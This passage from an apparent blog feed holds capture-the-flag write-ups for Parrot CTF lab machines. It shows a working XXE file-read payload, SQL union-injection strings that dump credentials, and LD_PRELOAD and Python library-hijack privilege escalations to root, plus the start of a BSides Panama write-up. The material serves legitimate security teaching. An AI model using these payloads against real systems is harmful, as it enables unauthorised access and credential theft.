&lt;p&gt;One thing I always check first is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;More info about privilege escalation techniques check &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/19.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see something interesting, the binary &lt;a&gt;php&lt;/a&gt; can be run as the root user.&lt;/p&gt;

&lt;p&gt;A quick search in Google tells us that we can escalate privileges with it, search in &lt;a href=&quot;https://gtfobins.github.io/gtfobins/php/#suid&quot;&gt;GTFOBins&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/20.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We execute the commands:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/21.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we are root :)&lt;/p&gt;

&lt;p&gt;Hope you like it and learn something new :)&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry><entry><title type="html">Blogger</title><link href="http://localhost:4000/parrotctf-blogger.html" rel="alternate" type="text/html" title="Blogger" /><published>2023-08-14T00:00:00-06:00</published><updated>2023-08-14T00:00:00-06:00</updated><id>http://localhost:4000/ParrotCtf-Blogger</id><content type="html" xml:base="http://localhost:4000/parrotctf-blogger.html">&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/1.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://parrot-ctfs.com/&quot;&gt;ü¶ú Parrot CTFs&lt;/a&gt; is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.&lt;/p&gt;

&lt;p&gt;This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges.&lt;/p&gt;

&lt;h1 id=&quot;content&quot;&gt;Content:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#xxe-&quot;&gt;XXE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation-&quot;&gt;Privilege escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration-&quot;&gt;Enumeration üîé:&lt;/h1&gt;

&lt;p&gt;We start by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; to check the TTL of the machine to determine the OS we are dealing with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: &lt;a href=&quot;https://ostechnix.com/identify-operating-system-ttl-ping/&quot;&gt;Identify OS using TTL value&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now, let‚Äôs go with an nmap scan to view the open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt; ‚Äì&amp;gt; We are doing a scan against all 65535 ports to search for open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--open&lt;/code&gt; ‚Äì&amp;gt; It will only report open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt; ‚Äì&amp;gt; It can be performed quickly, scanning thousands of ports per second.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rate 5000&lt;/code&gt; ‚Äì&amp;gt; It sets the minimum rate of packets sent per second to 5000.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; ‚Äì&amp;gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; ‚Äì&amp;gt; It will be verbose in its output.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; ‚Äì&amp;gt; This option skips the host discovery stage.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN&lt;/code&gt; ‚Äì&amp;gt; It will save the output in a file called ‚ÄúallPorts‚Äù.&lt;/p&gt;

&lt;p&gt;We find out the following open ports:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at what the page has.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at what the page has.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button.&lt;/p&gt;

&lt;h1 id=&quot;xxe-&quot;&gt;XXE üíâ:&lt;/h1&gt;

&lt;p&gt;Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/5.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/6.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Basically, our input is being placed as a XML structure, sooo maybe a &lt;a href=&quot;https://portswigger.net/web-security/xxe&quot;&gt;XXE (XML External Entity)&lt;/a&gt; injection?? let‚Äôs check it out.&lt;/p&gt;

&lt;p&gt;We can search for payloads in &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe&quot;&gt;PayloadAllTheThings&lt;/a&gt; and I used the clasic XXE to retrieve files.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY test SYSTEM &apos;file:///etc/passwd&apos;&amp;gt;]&amp;gt;&amp;lt;root&amp;gt;&amp;amp;test;&amp;lt;/root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a&gt;IMPORTANT&lt;/a&gt;: You need to url encode the ampersand (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt;) cause if you don‚Äôt, it will not work. It should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%26&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It works, now searching for the word &lt;a&gt;bash&lt;/a&gt; we can see two users &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jimmy&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we can search for configuration files, enumerate internal ports, and so on. But let‚Äôs focus on enumerating the web page more.&lt;/p&gt;

&lt;p&gt;We can do fuzzing to the web page to search for directories with tools like: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirsearch&lt;/code&gt;‚Ä¶ but I am going to use dirsearch in this case.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirsearch -u http://10.14.0.12/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And we found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/management&lt;/code&gt; directory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/7.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found this note in: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/management/admins/temp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/8.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found this other note in: /management/employees/jimmy the same user that we saw earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/9.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A id_rsa file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/jimmy/ssh/id_rsa.bak&lt;/code&gt;?? üò≥, let‚Äôs try to search the file with the XXE vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well with this we can log to the system as the user jimmy with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;400&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 400 id_rsa&lt;/code&gt;, and now connect with it:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -i id_rsa jimmy@10.14.0.12&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now that we are inside the machine you need to do one thing to ensure smooth operation:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export TERM=xterm&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will allow us to clean the screen with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/11.png&quot; width=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can see the flag üéâ.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation-&quot;&gt;Privilege escalation üö©:&lt;/h1&gt;

&lt;p&gt;We need to enumerate the system to find a way to escalate privileges.&lt;/p&gt;

&lt;p&gt;One thing I always check first is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.&lt;/p&gt;

&lt;p&gt;More info about privilege escalation techniques check &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see something interesting: &lt;a&gt;env_keep+=LD_PRELOAD&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A quick search in Google tells us that we can escalate privileges with it.&lt;/p&gt;

&lt;p&gt;We can go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and create a exploit like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void _init() {
	unsetenv(&quot;LD_PRELOAD&quot;);
	setgid(0);
	setuid(0);
	system(&quot;/bin/bash&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Save the file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatever.c&lt;/code&gt; and to compile it with:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc -fPIC -shared -o whatever.so whatever.c -nostartfiles&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This will create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatever.so&lt;/code&gt; file that we need it to execute:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo LD_PRELOAD=/tmp/whatever.so /usr/bin/ping&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And now we are root :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blogger/13.png&quot; width=&quot;200&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you like it and learn something new :)&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry><entry><title type="html">Brew Brothers</title><link href="http://localhost:4000/parrotctf-brew-brothers.html" rel="alternate" type="text/html" title="Brew Brothers" /><published>2023-06-03T00:00:00-06:00</published><updated>2023-06-03T00:00:00-06:00</updated><id>http://localhost:4000/ParrotCtf-Brew_Brothers</id><content type="html" xml:base="http://localhost:4000/parrotctf-brew-brothers.html">&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/1.jpg&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://parrot-ctfs.com/&quot;&gt;ü¶ú Parrot CTFs&lt;/a&gt; is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.&lt;/p&gt;

&lt;p&gt;This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges.&lt;/p&gt;

&lt;h1 id=&quot;content&quot;&gt;Content:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sqli-&quot;&gt;SQLI&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation-&quot;&gt;Privilege escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration-&quot;&gt;Enumeration üîé:&lt;/h1&gt;

&lt;p&gt;We start by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; to check the TTL of the machine to determine the OS we are dealing with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: &lt;a href=&quot;https://ostechnix.com/identify-operating-system-ttl-ping/&quot;&gt;Identify OS using TTL value&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now, let‚Äôs go with an nmap scan to view the open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt; ‚Äì&amp;gt; We are doing a scan against all 65535 ports to search for open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--open&lt;/code&gt; ‚Äì&amp;gt; It will only report open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt; ‚Äì&amp;gt; It can be performed quickly, scanning thousands of ports per second.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rate 5000&lt;/code&gt; ‚Äì&amp;gt; It sets the minimum rate of packets sent per second to 5000.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; ‚Äì&amp;gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; ‚Äì&amp;gt; It will be verbose in its output.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; ‚Äì&amp;gt; This option skips the host discovery stage.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN&lt;/code&gt; ‚Äì&amp;gt; It will save the output in a file called ‚ÄúallPorts‚Äù.&lt;/p&gt;

&lt;p&gt;We find out the following open ports:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at what the page has.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well‚Ä¶ nothing, it is a default page of apache2, so let‚Äôs start fuzzing.&lt;/p&gt;

&lt;p&gt;You can use whatever fuzzing tool you want, in my case I am going to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We are doing a simple fuzzing to find directories and we find website that seems interesting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/5.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;about.html&lt;/code&gt; page, but it is not interesting.&lt;/p&gt;

&lt;p&gt;So let‚Äôs start fuzzing again but this time let‚Äôs search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; pages.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We found these: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact.html&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact.html&lt;/code&gt; page doesn‚Äôt appear to have any functional or reflected elements where we can inject something.&lt;/p&gt;

&lt;p&gt;However the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search.html&lt;/code&gt; page is interesting because is trying to get data from something so we can try to test for SQLI.&lt;/p&gt;

&lt;h1 id=&quot;sqli-&quot;&gt;SQLI üíâ:&lt;/h1&gt;

&lt;p&gt;So how can we know if this is vulnerable to a SQL injection?, let‚Äôs do a simple injection like &lt;a&gt;‚Äô OR 1=1‚Äì -&lt;/a&gt; if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/6.png&quot; width=&quot;400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yeah! there is a result of all the entries that are in the actual db.&lt;/p&gt;

&lt;p&gt;Let‚Äôs start doing more injections üíâ:&lt;/p&gt;

&lt;p&gt;This is to view which fields of output we have control over.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,2-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/7.png&quot; width=&quot;100&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is to view all the available databases. There, we can see an interesting database name, which is &lt;a&gt;creds&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos; union select 1,group_concat(schema_name) from information_schema.schemata-- -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/8.png&quot; width=&quot;500&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this, we can view the table names of the database, and there is only one table, which is named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credentials&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;creds&quot;-- -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/9.png&quot; width=&quot;180&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this, we can see the column names, which are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;creds&quot; and table_name=&quot;credentials&quot;-- -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/10.png&quot; width=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So know that we have enumerating the db let‚Äôs retrive all the usernames and passwords.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos; union select 1,group_concat(username,&quot;:&quot;,password) from creds.credentials-- -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/11.png&quot; width=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this we can retrive only one credential that is: charles:pyvzngr&lt;/p&gt;

&lt;p&gt;You can learn to do this injections &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/sql-injection&quot;&gt;here&lt;/a&gt;, and remember there is a lot of material out there for you to learn more about SQLI.&lt;/p&gt;

&lt;p&gt;So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user ‚Äú&lt;strong&gt;charles&lt;/strong&gt;‚Äù.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation-&quot;&gt;Privilege escalation üö©:&lt;/h1&gt;

&lt;p&gt;Now that we are inside the machine you need to do some things to ensure smooth operation:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export TERM=xterm&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will allow us to clean the screen with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We need to enumerate the system to find a way to escalate privileges.&lt;/p&gt;

&lt;p&gt;One thing I always check first is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.&lt;/p&gt;

&lt;p&gt;More info about privilege escalation check &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that we can execute a python3 script like root user but we can‚Äôt edit it :(&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/13.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The script basically hashes a random value and writes it to a file. It doesn‚Äôt seem to be useful, but we can see that it imports various libraries.&lt;/p&gt;

&lt;p&gt;The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/14.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, the only thing we need to do to become root is to execute the script with sudo privileges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/BrewBrothers/15.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you like it and learn something new :)&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry><entry><title type="html">Bsides Panama 2023</title><link href="http://localhost:4000/bsides-panama-2023.html" rel="alternate" type="text/html" title="Bsides Panama 2023" /><published>2023-02-01T00:00:00-06:00</published><updated>2023-02-01T00:00:00-06:00</updated><id>http://localhost:4000/bsides-panama-2023</id><content type="html" xml:base="http://localhost:4000/bsides-panama-2023.html">&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/banner.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quiero dar un agradecimiento especial para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tiz&lt;/code&gt; &amp;lt;3 sin √©l este writeup no hubiera sido posible, dejo por aqu√≠ sus redes sociales.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/cap_tiz&quot;&gt;Twitter&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/john-a-kent&quot;&gt;Linkedin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;retos&quot;&gt;Retos:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#archivo-de-respaldo-webserver&quot;&gt;Archivo de respaldo (WebServer)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acceso-usuario-webserver&quot;&gt;Acceso usuario (WebServer)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acceso-administrativo-webserver-ruta-alternativa&quot;&gt;Acceso administrativo (WebServer)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#wordpress-webserver-ruta-alternativa&quot;&gt;Wordpress (WebServer)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#passwordtxt-webserver2&quot;&gt;Password.txt (WebServer2)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acceso-usuario-webserver2&quot;&gt;Acceso usuario (WebServer2)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acceso-administrativo-webserver2&quot;&gt;Acceso administrativo (WebServer2)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#plataforma-web-webserver2-ruta-alternativa&quot;&gt;Plataforma WEB (WebServer2)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;topolog√≠a-de-red&quot;&gt;Topolog√≠a de red:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/1.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

